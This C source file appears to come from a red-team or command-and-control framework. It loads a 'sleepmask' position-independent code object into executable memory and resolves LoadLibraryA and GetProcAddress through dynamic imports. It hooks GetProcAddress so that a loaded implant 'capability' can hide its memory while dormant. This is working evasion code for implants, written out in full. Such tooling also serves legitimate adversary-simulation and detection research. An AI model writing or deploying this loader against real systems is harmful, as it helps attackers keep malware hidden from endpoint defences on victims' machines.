#include <windows.h>
#include "../compost.h"
#include "../tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef void (*SLEEPMASK_PICO)(char *capability, size_t size);

DWORD __tag_sleepmask();
char __PICODATA__[0] __attribute__((section("sleep_pico")));

char * find_sleep_pico() {
    return (char *)&__PICODATA__;
}

void *get_sleep_hook(char *capability, size_t size) {
	// Uses LibTCG to load a linked PICO, which is used to hook GetProcAddress for the loaded capability. The sleepmask PICO is not obfuscated.
	
	char *pico = find_sleep_pico();
	
	// Resolve necessary WIN32 APIs.
	IMPORTFUNCS funcs;
	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
	
	// Allocate memory.
	char *pico_data = KERNEL32$VirtualAlloc(NULL, PicoDataSize(pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
	char *pico_code = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
                       
	// Load the sleepmask PICO.
	PicoLoad(&funcs, pico, pico_code, pico_data);
	
	// Set up the sleepmask PICO to provide it with the address and size of the capability.
	SLEEPMASK_PICO entrypoint = (SLEEPMASK_PICO) PicoEntryPoint(pico, pico_code);
	entrypoint(capability, size);
	
	// Retrieve a pointer to the sleepmask() function from the loaded PICO.
	void *sleep_hook = (void *) PicoGetExport(pico, pico_code, __tag_sleepmask());
	
	return sleep_hook;
}
